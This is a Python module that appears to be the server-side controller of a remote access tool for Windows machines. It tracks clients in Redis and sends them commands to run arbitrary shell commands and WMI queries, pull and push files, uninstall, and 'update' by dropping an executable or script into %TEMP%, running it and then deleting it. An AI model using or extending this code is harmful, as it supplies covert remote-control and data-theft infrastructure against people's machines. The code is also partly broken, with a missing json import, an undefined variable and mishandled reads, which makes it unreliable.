from config import Conf
import os
import time
import select, socket, urllib
import sys, os, struct, re, errno, time, random, hashlib, traceback, tempfile
import redis

from config import Conf

BUFF_SIZE = 0x200


g_log_file = None
g_start_time = time.time()
log_timestamp = lambda: time.strftime(Conf.TIME_FORMAT, time.localtime())


try:

    # https://pypi.org/project/defusedxml/
    import defusedxml.minidom

except ImportError:

    print('ERROR: defusedxml is not installed')
    exit(-1)
    
    

def log_write(data):

    global g_log_file

    data = '[%s]: %s' % (log_timestamp(), data)
    
    sys.stdout.write(data)
    sys.stdout.flush()
    
    data = data.encode('UTF-8')
    
    print(type(data))
    if g_log_file is not None:

        g_log_file.write(data)
        g_log_file.flush()

    

def log_open(path):

    global g_log_file

    log_write(u'Log file path is \"%s\"\n' % path)

    g_log_file = open(path, 'wb')


class Client(object):

    def __init__(self, client_id, **props):

        self.client_id, self.props = client_id, props

        for name, val in props.items():

            setattr(self, name, val)        


class ClientHelper(object):

    def __init__(self, client_id = None, sock = None):

        self.sock, self.client_id = sock, client_id
        self.redis = None

    def send(self, data):

        # send all of the data
        return self.sendall(data)

    def sendall(self, data):

        assert self.sock is not None

        return self.sock.sendall(data)            

    def recv(self, size):

        assert self.sock is not None

        return self.sock.recv(size)

    def recvall(self, size):

        ret = ''

        assert self.sock is not None

        while len(ret) < size:
            
            # receive specified amount of data
            data = self.sock.recv(size - len(ret))
            assert len(data) > 0

            ret += data

        return ret

    def create_folders(self):

        assert self.client_id is not None

        if not os.path.isdir(Conf.LOG_DIR_PATH):

            # create base logs folder
            os.mkdir(Conf.LOG_DIR_PATH)    

        if not os.path.isdir(Conf.DOWNLOADS_DIR_PATH):

            # create base downloads folder
            os.mkdir(Conf.DOWNLOADS_DIR_PATH)        

        log_path = os.path.join(Conf.LOG_DIR_PATH, '%s.log' % self.client_id)
        downloads_path = os.path.join(Conf.DOWNLOADS_DIR_PATH, self.client_id)

        if not os.path.isfile(log_path):

            # create client log file
            with open(log_path, 'wb'): pass

        if not os.path.isdir(downloads_path):

            # create client downloads folder
            os.mkdir(downloads_path)    

    def get_id(self):

        assert self.sock is not None

        # query client ID
        self.sendall('id\n')

        ret = ''

        while len(ret) == 0 or ret[-1] != '\n':
            
            data = self.recv(BUFF_SIZE)
            assert len(data) > 0

            ret += data

        data = data.strip()

        # validate received ID
        assert len(data) == 128 / 8 * 2
        assert re.search('^[A-Fa-f0-9]+$', data) is not None

        return data

    def get_info(self):

        assert self.sock is not None

        # query basic client information
        self.sendall('info\n')

        ret = ''

        while len(ret) == 0 or ret[-1] != '\n':
            
            data = self.recv(BUFF_SIZE)
            assert len(data) > 0

            ret += data

        # parse and validate received information
        ret = ret.decode('UTF-8').strip().split('|')

        return ret if len(ret) == 6 else None

    def ping(self):

        assert self.sock is not None

        self.sendall('ping\n')

    def exit(self):

        assert self.sock is not None

        self.sendall('exit\n')

    def uninstall(self):

        assert self.sock is not None

        self.sendall('uninst\n')

    def _is_end_of_output(self, data):    

        # check for end of the command output magic value
        m = re.search('\{\{\{#([0123456789abcdef]{8})\}\}\}$', data)
        if m is not None:

            # get exit code value
            return data[: data.find(m.group(0))], int('0x' + m.group(1), 16)

        return None

    def _execute(self, cmd, stream = None):

        cmd = cmd.strip()

        assert len(cmd) > 0
        assert self.sock is not None

        # send command string
        self.sendall(cmd.encode('UTF-8') + '\n')

        ret, code = '', None

        while True:

            # receive the command output
            data = self.recv(BUFF_SIZE)
            assert len(data) > 0            

            m = self._is_end_of_output(data)
            if m is not None:

                # end of the command output
                data, code = m

            ret += data            

            if m is not None: 

                break

        ret = ret.decode('UTF-8')

        if stream is not None: 

            # write data to the stream at the end of the output
            stream.write(ret)

        return ret, code

    def execute(self, cmd, stream = None, log = True):

        assert self.client_id is not None

        log_path = os.path.join(Conf.LOG_DIR_PATH, '%s.log' % self.client_id)

        with open(log_path, 'ab') as fd:

            if log:

                message = u'[%s]: COMMAND: %s\n' % (log_timestamp(), cmd)

                # write log file message
                fd.write(message.encode('UTF-8'))

            # execute command on the client
            data, code = self._execute('exec ' + cmd.strip(), stream = stream)

            if log:

                # log command output
                fd.write('[%s]: EXIT CODE: 0x%.8x\n\n' % (log_timestamp(), code))
                fd.write(data.encode('UTF-8') + '\n')

            return data, code

    def temp_path(self):

        # query %TEMP% environment variable from the client
        data, code = self.execute('echo %TEMP%', log = False)
        data = data.strip()

        if len(data) > 0 and data[-1] == '\\':

            # remove ending slash
            data = data[: -1]

        assert code == 0
        assert len(data) > 0

        return data

    def execute_wmi(self, wmi_class, props = None):

        assert self.client_id is not None

        query = '%s get ' % wmi_class

        if isinstance(props, basestring): query += props
        elif isinstance(props, list): query += ','.join(props)

        log_write(u'execute_wmi(%s): %s\n' % (self.client_id, query))

        # execute WMI query with XML output
        data, code = self.execute('wmic %s /format:rawxml' % query, log = False)
        data = data.strip()

        if code != 0:

            log_write(u'execute_wmi(%s) ERROR: wmic returned 0x%x\n' % (self.client_id, code))
            return None        

        try:

            assert len(data) > 0

            # parse query results
            doc = defusedxml.minidom.parseString(data)
            root = doc.documentElement
            res = root.getElementsByTagName('RESULTS')[0]

            try:

                # check for an error
                err = res.getElementsByTagName('ERROR')[0]
                log_write(u'execute_wmi(%s) ERROR: Bad result\n' % self.client_id)
                return None

            except IndexError: pass

            ret = {}

            # enumerate returned properties
            for e in res.getElementsByTagName('PROPERTY'):

                name = e.getAttribute('NAME')
                vals = e.getElementsByTagName('VALUE')

                if len(vals) > 0 and len(vals[0].childNodes) > 0: 

                    # get property value
                    ret[name] = vals[0].childNodes[0].data

                else: 

                    ret[name] = None

            if isinstance(props, basestring): return ret[props]

            return ret

        except Exception:

            log_write(u'execute_wmi(%s) ERROR: %s\n' % (self.client_id, str(why)))
            return None

    def os_version(self):

        # get oprating system information from appropriate WMI class
        data = self.execute_wmi('os', props = [ 'Name', 'OSArchitecture' ])
        if data is None: return None

        try:
        
            # parse returned data
            return '%s %s' % (data['Name'].split('|')[0], data['OSArchitecture'])

        except KeyError:

            return None

    def hardware_info(self):

        # get CPU information
        info_cpu = self.execute_wmi('cpu', props = 'Name')
        if info_cpu is None: return None

        # get memory information
        info_mem = self.execute_wmi('os', props = 'TotalVisibleMemorySize')
        if info_mem is None: return None

        try:
        
            # parse returned data
            return '%s, %d GB RAM' % (info_cpu, int(info_mem) / (1024 * 1024) + 1)

        except KeyError:

            return None

    def update(self, path):

        assert os.path.isfile(path)

        name = os.path.basename(path)
        cmd, ext = '', name.split('.')[-1]

        # get temporary location to save the executable
        remote_path = self.temp_path() + '\\' + name

        if ext == 'exe': 

            # regular PE EXE
            cmd = remote_path

        elif ext == 'js': 

            # JScript file to be exected with cscript.exe
            cmd = 'cscript.exe ' + remote_path

        else:

            log_write(u'update(%s) ERROR: Unknown file type' % self.client_id)
            return False

        # upload file to the client
        if not self.file_put(remote_path, path):

            return False

        remote_cmd = 'cmd.exe /C "%s & ping 127.0.0.1 -n 3 > NUL & del %s"' % \
                     (cmd.encode('UTF-8'), remote_path.encode('UTF-8'))

        log_write(u'update(%s): %s\n' % (self.client_id, remote_cmd))

        # execute update command on the client
        self.sendall('upd ' + remote_cmd + '\n')

        try:

            assert len(self.recvall(1)) > 0
            return False

        except:

            return True

    def file_list(self, path):

        assert self.client_id is not None

        log_write(u'file_list(%s): %s\n' % (self.client_id, path))

        # list of the files in specified folder
        data, code = self._execute('flist ' + path.strip())
        if code != 0: 

            # command failed
            log_write(u'ERROR: file_list() failed with code 0x%.8x\n' % code)
            return None

        ret = []

        # enumerate results
        for line in data.strip().split('\n'):

            if len(line) == 0: continue

            line = line.split(' ')
            assert len(line) > 1

            # parse single file/directory information
            ret.append(( None if line[0] == 'D' else int(line[0], 16), ' '.join(line[1 :]) ))

        return ret

    def file_get(self, path, local_path):

        ret = False

        assert len(path) > 0
        assert self.sock is not None
        assert self.client_id is not None

        log_write(u'file_get(%s): Downloading file \"%s\" into the \"%s\"\n' % \
                  (self.client_id, path, local_path))

        # send download file command
        self.sendall('fget ' + path.encode('UTF-8') + '\n')

        with open(local_path.encode('UTF-8'), 'wb') as fd:            

            # receive file size
            size = self.recvall(8)
            assert len(size) == 8

            size = struct.unpack('Q', size)[0]
            if size != 0xffffffffffffffff:

                recvd = 0

                log_write(u'file_get(%s): File size is %d\n' % (self.client_id, size))

                while recvd < size:
                    
                    # receive file contents
                    data = self.recv(min(BUFF_SIZE, size - recvd))
                    if len(data) == 0:

                        raise(Exception('Connection error'))

                    # write the data into the local file
                    fd.write(data)
                    recvd += len(data)

                ret = True

            else:

                # command failed
                log_write(u'ERROR: file_get() failed\n')

        if not ret and os.path.isfile(local_path):

            # remove local file in case of any errors
            os.unlink(local_path)

        return ret

    def file_put(self, path, local_path):

        ret = False

        assert len(path) > 0
        assert os.path.isfile(local_path)
        assert self.sock is not None
        assert self.client_id is not None

        log_write(u'file_put(%s): Uploading file \"%s\" into the \"%s\"\n' % \
                  (self.client_id, local_path, path))

        # get local file size
        size = os.path.getsize(local_path)

        log_write(u'file_put(%s): File size is %d\n' % (self.client_id, size))

        # send upload file command 
        self.sendall('fput ' + path.encode('UTF-8') + '\n')

        status = self.recvall(1)
        assert len(status) == 1

        status = struct.unpack('B', status)[0]
        if status == 0:

            # command failed
            log_write(u'ERROR: file_put() failed\n')
            return False

        # send file size
        self.sendall(struct.pack('Q', size))

        with open(local_path, 'rb') as fd:

            sent = 0

            while sent < size:

                # read file contents from the local file
                data = fd.read(min(BUFF_SIZE, size - sent))
                assert len(data) > 0
                
                # send data to the client
                self.sendall(data)
                sent += len(data)

            ret = True

        return ret

    def mapper_connect(self):

        # query client informaion
        client = self.client_get()
        if client is None: 

            return False

        # connect to the client process
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect(( Conf.MAPPER_HOST, client.map_port ))

        return True

    def redis_connect(self):

        if self.redis is None:

            # connect to the database
            self.redis = redis.Redis(host = Conf.REDIS_HOST, port = Conf.REDIS_PORT, db = Conf.REDIS_DB)

    def client_add(self, **props):

        assert self.client_id is not None

        self.redis_connect()

        log_write(u'client_add(%s)\n' % self.client_id)

        # add client info to the database
        self.redis.set(self.client_id, json.dumps(props))

    def client_get(self, client_id = None):

        client_id = self.client_id if client_id is None else client_id
        assert client_id is not None

        self.redis_connect()

        # get client info from the database
        data = self.redis.get(client_id)

        # create Client instance
        return data if data is None else Client(client_id, **json.loads(data))

    def client_del(self):

        assert self.client_id is not None

        self.redis_connect()

        log_write(u'client_del(%s)\n' % self.client_id)

        # remove client info from the database
        self.redis.delete(self.client_id)

    def client_del_all(self):

        self.redis_connect()

        self.redis.flushdb()

    def client_list(self):

        self.redis_connect()

        ret = []

        # enumerate all the known clients
        for k in self.redis.keys():

            # query each client infor
            client = self.client_get(k)
            if client is not None: ret.append(client)

        return ret
